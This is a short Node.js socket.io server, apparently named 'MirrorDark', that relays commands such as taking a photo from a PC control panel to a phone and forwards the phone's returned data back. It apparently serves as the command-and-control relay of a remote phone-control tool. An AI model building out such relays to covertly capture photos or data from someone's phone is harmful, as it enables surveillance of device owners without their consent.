const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Servir la carpeta web para tu panel de control en la PC
app.use(express.static('public'));

io.on('connection', (socket) => {
    console.log(`[+] Dispositivo conectado: ${socket.id}`);

    // Cuando tú desde la PC envías un comando (ej. "Tomar foto")
    socket.on('command_to_phone', (data) => {
        console.log(`[>] Enviando comando: ${data.action}`);
        io.emit('command_to_phone', data); // Se lo mandamos al celular
    });

    // Cuando el celular responde mandando los datos de vuelta
    socket.on('phone_response', (data) => {
        console.log(`[<] Datos recibidos del celular (${data.type})`);
        io.emit('phone_response', data); // Te lo devolvemos a tu panel en la PC
    });

    socket.on('disconnect', () => {
        console.log(`[-] Dispositivo desconectado: ${socket.id}`);
    });
});

// Render asigna un puerto automático con process.env.PORT; si no existe, usa el 3000 localmente
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Servidor MirrorDark corriendo en el puerto ${PORT}`);
});